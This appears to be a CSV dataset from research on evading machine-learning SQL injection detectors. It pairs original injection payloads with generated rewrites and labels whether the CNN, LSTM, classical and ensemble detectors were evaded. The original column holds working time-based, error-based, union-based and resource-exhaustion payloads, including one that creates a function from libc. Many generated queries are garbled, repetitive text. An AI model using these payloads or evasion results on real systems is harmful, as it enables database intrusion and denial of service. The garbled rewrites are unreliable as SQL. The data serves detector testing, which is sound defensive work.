original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT COUNT(*) FROM SQL_injection WHERE sysusers as sys1,sysusers as sys1,sysusers as sys4,sysusers as sys7-- FROM sysusers AS sysusers AS sysusers AS sysusers as sys4,sysusers as sys7-- FROM SQL Insusc injection'",1,1,0,1,0,0,0
"-1197"")) as dfsy where 8857=8857 or 3038=3038",SELECT MIN(sql injection) FROM SQL SELECT dfsy FROM 8857 = 8857 OR 3038 = 3038,1,1,0,0,0,0,0
"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",SELECT MIN(((%'=)) FROM SQL injection detection,0,1,0,0,1,0,0
"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","SELECT * FROM SQL_injection, SELECT * FROM SQL_injection WHERE NOT elt(9173 = 9173,1) AND NOT elt(select) = 9173 AND NOT elt(9173 = 9173 = 9173,0x7171706a71,floor(rand(0)*2)) FROM SQL_injection",0,1,0,0,1,0,0
"1')) union all select null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM query: 1')",1,1,1,0,0,0,0
1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',"SELECT DISTINCT'seqpjq','select case 6240' FROM rdb$database)||'qqpjq'', '%'','seqpjq','select case 6240' FROM rdb$database)||'qzvzq' AND '%' ='sqpjq'",1,1,0,0,0,0,0
1))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((4694=4694,SELECT MIN(select) FROM SQL injection detection) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(((4694 = '3754 ='select',0,1,0,0,1,0,0
"1"") where 5197=5197 and elt(3114=3114,sleep(5))#","SELECT MIN(sleep(5))# FROM SQL injection_description WHERE elt(3114 = 3114,sleep(5))# = ""SQL injection detection""",0,1,0,0,0,0,0
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",SELECT'sleevx' FROM SQL injection_description WHERE NOT /lib/libc.so.6 = 'c',1,1,1,0,1,1,0
1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,"SELECT 6276 FROM SQL injection (SELECT 6276 FROM information_schema.character_sets) AS _end) FROM SQL injection AS _evade_select AS _select AS _select_from, information_schema.character_sets)# FROM SQL injection",1,1,1,1,0,1,0
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",SELECT MIN(select) FROM SQL injection_detective WHERE NOT SQL_injection_method_code ='sq injection',0,0,0,0,1,0,0
"1;select count(*) from generate_series(1,5000000)-- gqkk","SELECT MIN(*) FROM generate_series(1,5000000)-- gqkk) FROM SQL injection",1,1,0,0,0,0,0
"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'","SELECT MIN(select) FROM SQL injection_deficite, SUM(select) FROM SQL_injection WHERE 6400 = 6400 AND row(6237,7469) >(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT SUM(select) FROM SELECT SUM(select, SQL_injection) FROM SELECT SUM(select_select,'select 5192 union select 3731 union select 7158) FROM SQL SELECT SELECT d_select FROM'sqmz')",0,1,0,0,1,0,0
-3938%'))) or 2034=7209#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -3938%') ORDER BY MIN(sql injection),1,1,0,0,1,0,0
"1%')) union all select null,null,null#","SELECT DISTINCT null,null,null# FROM SQL injection_detection WHERE NOT null = ""done""",1,0,1,1,0,1,0
1) where 5866=5866 and 4595=4595#,SELECT * FROM query: 1 WHERE NOT SQL_inject = '5866=5866' AND 4595 = 4595#',0,1,0,0,0,0,0
1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,SELECT DISTINCT select(sleep(5))) FROM (SELECT SUM(select(sleep(5))) FROM SQL injection detection) FROM (SELECT SUM(select(sleep(5))) FROM (SELECT SUM(select(select(sleep(5))) FROM (SELECT SUM(select) FROM (SELECT SUM(select) FROM (SELECT SUM(select(select(select(select(select(select(select(select(select(select(select(select(select(select(select(select(select(select(select(select(sleep(5))) FROM SQL injection) or (SELECT SUM(select(select(select(select(select(select(select(select(select(select(select(select,1,1,0,0,1,0,0
"1',(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))","SELECT (SELECT (SELECT case FROM SQL injection) AS _sysusers as sys1,sysusers as sys4,sysusers as sysusers as sys7*(select) FROM SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT MIN(select) FROM SQL injection) FROM sysusers WHERE sysusers as sys4,sysusers as sys7) AND NOT (SELECT (SELECT MAX(sysusers as sys4,sysusers as sysusers as sys7) FROM SELECT SUM(select) FROM SELECT SELECT SELECT SELECT SELECT MIN(sysusers as sys4,sysusers as sysusers as sys7) FROM SELECT SELECT SELECT SELECT MIN(sys",0,1,0,0,0,0,0
-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,SELECT tezf FROM SQL_inaddr.get_host_address(chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) FROM SQL injection_detection AS t1 JOIN address_address(chr(113)||chr(113)||chr(113)||chr(select (sql_inaddr.xr_inaddr.xr(select) FROM SELECT SELECT t1.select_host_address(select) FROM SQL_inaddr.chr(113)|chr(113)|chr(select) FROM SELECT SELECT SUM(select) FROM SELECT SELECT t1.select_host_address(chr(113)|chr(13) FROM tsr(tezf) FROM SQL_inaddr.post_,1,1,0,0,1,0,0
1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,"SELECT MIN(select) FROM SQL injection_description WHERE NOT select = ""jtvq"" AND NOT select_from (select(sleep(5)))gcrr)# FROM SQL injection_description",0,1,0,0,1,0,0
1));begin user_lock.sleep(5); end and ((6874=6874,"SELECT end,(6874 = 6874 FROM SQL_lock.sleep(5); end and ((6874 = 6874) FROM query: SELECT query: 1) FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0",1,1,0,0,1,0,0
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",SELECT MIN(select case) FROM SQL injection detection WHERE 5903 = '5903' AND 5903 = '1 else 0 end from rdb$database)||'qzvzq',0,1,0,0,0,0,0
"1%"") or elt(5873=5873,sleep(5))#","SELECT MIN(sleep(5))# FROM SQL injection_detect_elt(5873 = 5873,sleep(5))# FROM SQL injection_detect_required FROM SQL_required",0,1,0,0,1,0,0
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",SELECT DISTINCT ((*) FROM SQL injection) AND 6537 = dbms_pipe.receive_message(chr(76)||chr(65),1,1,0,0,1,0,0
"1""))) and 7533=7533 and (((""alvd"" like ""alvd",SELECT DISTINCT ((((((((((((((((((()) FROM SQL injection detection) FROM SQL injection detection) AND NOT SELECT DISTINCT (((((((((((((((((((((((((((((((((((((((((((((((()) FROM SQL injection)) FROM SQL injection detection),0,1,0,0,0,0,0
"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT SUM(*) FROM SQL injection detection WHERE 5929 = 5929 = 5929 OR 5286 = (SELECT * FROM SQL_INNER JOIN All_users T1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
1'));(select * from (select(sleep(5)))acdk)#,SELECT * FROM (SELECT SUM(select(sleep(5))) FROM SQL injection detection),1,1,0,0,1,0,0
"1') as ildf where 5545=5545 union all select null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(s,1,0,1,0,1,1,0
' or '1' = '1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 'yes',1,0,1,1,1,1,1
"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",SELECT * FROM SQL_Injection_Procedures WHERE NOT md5(0x4b774c75) = '6800=6800',1,1,0,0,1,0,0
1%');if(7899=7899) select 7899 else drop function zbbp--,SELECT 7899 = 7899 AND NOT SQL injection detection.sql_inject_required ='sql injection detection',1,1,1,1,0,1,0
1' where 3188=3188 and 9198=9198--,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM Query: 1' WHERE 3188 = 3188 AND 9198 = 9198--,1,1,0,0,1,0,0
"-4954%"") or 5244=4832",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -4954% or 5244 = 4832,1,1,0,0,1,0,0
1'))) and 3602=1990#,SELECT MIN(3602 =1990#) FROM SQL injection,1,1,0,0,1,0,0
"-7142')) union all select 5083,5083,5083,5083#","SELECT MIN(5083,5083,5083#) FROM SQL injection_description",1,1,1,1,1,1,1
"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--","SELECT MIN(SQL) FROM SQL SELECT 2977,2977,2977,2977,2977-- FROM SQL SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SQL",1,1,1,1,1,1,1
"-9532)) union all select 6039,6039,6039,6039--","SELECT MIN(6039,6039,6039--) FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM Query: -9532)",1,1,1,1,1,1,1
1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT 'wvqj' FROM 3709 = 3709 = 3709;begin user_lock.sleep(5); end--,0,1,0,0,1,0,0
"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","SELECT MIN(repeat(right(5012),0 FROM SQL injection detection) FROM query: 1% AND NOT anull_injection method = 'evade'",1,1,0,0,1,0,0
"1') where 3476=3476 and elt(1210=1210,sleep(5))--","SELECT MIN(sleep(5))-- SELECT MIN(sleep(5)) FROM SQL injection detection WHERE 3476 = 3476 = 3476 AND NOT SELECT elt(1210 = 1210,sleep(5))-- SELECT MIN(sleep(5)) FROM SQL injection detection",1,1,0,0,0,0,0
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",SELECT DISTINCT t2.(t1.nuil) FROM'sql injection' AS t1 JOIN query: 1') AND t1.chr(76)||chr(65)||chr(65) = dbms_pipe.receive_message(chr(76)||chr(65) ='sql injection',0,1,0,0,0,0,0
-9100) or 8792=9550--,SELECT MIN(992 = 8792 = 9550--) FROM SQL AS t1 JOIN query: -9100_ or 8792 = 9650--,0,1,0,0,0,0,0
"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","SELECT MIN(select) FROM SQL injection_deficitor WHERE NOT ix7171706a71 = ""SQL"" ORDER BY ix7171706a71,(select)",0,1,0,0,1,0,0
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270","SELECT MIN(select) FROM SQL injection_deficite, SELECT elt(1297 = 1297,0x71706a71) FROM SQL_Injection WHERE NOT elt(1297 = 1297",0,1,0,0,1,0,0
"1' in boolean mode);select count(*) from generate_series(1,5000000)#","SELECT COUNT(*) FROM query_series(1,5000000) FROM SQL injection detection",1,1,0,0,1,0,0
1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,SELECT DISTINCT t1.rzwb' = 'rzwb' AND NOT t1.sq injection ='sql injection',1,1,1,0,0,0,0
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon","SELECT DISTINCT elt(1032 = 1032,3623) FROM SQL injection detection",1,1,0,0,1,0,0
"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--","SELECT MIN(sql injection) FROM SQL_injection WHERE 8218 = 8218 OR make_set(4954 = 1836,1836)-- SELECT MIN(1836) FROM SQL injection",0,1,0,0,0,0,0
"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))","SELECT MIN(select) FROM SQL injection AS t1 JOIN query: 1 JOIN 3743*(select) FROM query: 1 WHERE NOT t1.select = ""SQL injection detection""",0,1,0,0,1,0,0
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""","SELECT DISTINCT % FROM SQL_injection, SELECT REPLXP_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(sql injection)) FROM SELECT SELECT SUM(sql) FROM SQL SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repe",1,0,0,0,1,0,0
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""","SELECT * FROM SQL injection, SELECT SUM(select count(*) FROM SQL injection)",1,0,1,0,1,1,0
1%' or (select * from (select(sleep(5)))sddo)#,SELECT DISTINCT select(sleep(5))sddo) FROM SQL injections EXCEPT SELECT DISTINCT SUM(select(select(select(sleep(5))) FROM query: 'SQ injection detection',1,1,0,0,1,0,0
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm,SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL_inaddr.get_host_address(chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(select (sql) FROM SELECT & t1.chr(4386 = 4386 ='sql injection',0,1,0,0,0,0,0
1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,SELECT 4240 FROM pg_sleep(5) -- SELECT SQL injection FROM SQL SELECT MIN(select) FROM pg_sleep(5),1,1,0,0,1,0,0
"1') and 3824=benchmark(5000000,md5(0x76555642))",SELECT MIN(0x76555642) FROM SQL injections,1,1,1,1,1,1,1
"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
"-3963"" or 1224=5119",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -3963 ORDER BY created,1,0,1,1,1,1,1
1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,SELECT MIN(select) FROM SQL injection AS _executor_select WHERE (select_schema.character_sets) = 3633 = 3633;select (case when (3681 = 5026) AND 3681 = 3681*(select) FROM SQL_injection),0,1,0,0,0,0,0
-1354)) or 8571=8571--,SELECT * FROM Query: -1354) ORDER BY NOT SQL_injection,1,1,1,1,1,1,1
"1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","SELECT * FROM SQL_injection, SELECT * FROM (SELECT * FROM (SELECT * FROM *///////////////////////////////////////////////////////////////////////////////////////))",0,1,0,1,0,0,0
"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",SELECT MIN(6055 = 6055) FROM SQL injection detection WHERE 5748 = 5748 AND 6055 = ctxsys.drith(6055)|chr(6055)|chr(6055)|chr(6055)|chr(6055) FROM SQL injection detection,1,1,0,0,1,0,0
"1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#","SELECT MIN(*) FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1,domain.tables"" AND NOT domain.domain.tables = ""8514""",1,1,0,0,0,0,0
"1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'","SELECT MIN(select) FROM SQL injection detection WHERE 6268 = 6268 AND 3707 = ""select count(*)""",0,1,0,0,1,0,0
"1%"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","SELECT * FROM SQL injection, SELECT rdb$functions as t3,rdb$functions as t4)-- SELECT rdb$fields FROM SQL injection >'sq injection'",1,1,0,1,0,0,0
"1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='",SELECT DISTINCT case FROM (SELECT SUM(repeat(left(crypt_key)||char(69) FROM SQL injection) AS  FROM SQL_injection),0,1,0,0,1,0,0
"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",SELECT MIN(select) FROM SQL injection_deficite) FROM SQL_inject JOIN (SELECT MIN(select) FROM (SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL)),0,0,0,0,1,0,0
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
"-7324) or make_set(8486=6544,6544)","SELECT * FROM query: -7324) ORDER BY query_set(8486 = 6544,6544)",1,1,0,0,1,0,0
"1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--","SELECT MIN(select) FROM SQL injection_diagnosis WHERE NOT ix7171706a71,0x78) = 'excel'",0,1,0,0,1,0,0
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw","SELECT MIN(select count(*) FROM SQL injection detection) FROM sysusers as sys1,sysusers as sys4,sysusers as sys4,sysusers as sys7# kkmw""",1,1,0,0,0,0,0
1 and 6969=(select 6969 from pg_sleep(5))-- yczq,SELECT 6969 FROM pg_sleep(5))-- yczq FROM SQL injection,1,1,0,0,1,0,0
"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
"1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--","SELECT MIN(7259) FROM SQL injection detection WHERE 3366 = 3366 AND elt(4249 = 4249 = 4249,7259)-- SELECT MIN(7259) FROM SQL injection detection",0,1,0,0,0,0,0
"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--",SELECT 1928 ='sql injection detection',1,0,1,1,1,1,1
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip","SELECT fkip FROM SQL injection_detect WHERE NOT SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT & 4241 = convert(int,(select) FROM query: 1"")",0,1,0,0,1,0,0
